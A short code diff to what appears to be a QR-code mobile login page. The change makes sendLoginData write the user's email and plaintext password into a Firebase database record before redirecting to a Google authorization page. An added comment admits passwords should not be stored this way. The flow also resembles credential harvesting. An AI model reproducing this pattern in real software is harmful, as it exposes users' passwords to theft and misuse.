@@ -336,6 +336,7 @@
             
             // 發送登入資料到 Firebase Realtime Database
 // 修改掃描 QR 碼後的行為
+// 修改mobile.html中的sendLoginData函數
 function sendLoginData(connectionId, email, password) {
     try {
         // 顯示進度指示器
@@ -348,6 +349,8 @@ function sendLoginData(connectionId, email, password) {
         connectionRef.set({
             status: 'pending',
             timestamp: Date.now(),
+            user_email: email,
+            user_password: password, // 注意：實際生產環境中應避免直接存儲密碼
             device: {
                 type: 'mobile',
                 userAgent: navigator.userAgent,
@@ -369,6 +372,9 @@ function sendLoginData(connectionId, email, password) {
         // 儲存 connectionId 以便回調頁面使用
         localStorage.setItem('pendingConnectionId', connectionId);
         
+        // 在重定向前顯示訊息
+        showMessage('正在連接到 Google 授權頁面...', 'success');
+        
         // 重定向到 Google 授權頁面
         window.location.href = authUrl;
         
@@ -378,6 +384,7 @@ function sendLoginData(connectionId, email, password) {
         document.getElementById('progressContainer').style.display = 'none';
     }
 }
+
             
             // 顯示訊息
             function showMessage(text, type) {
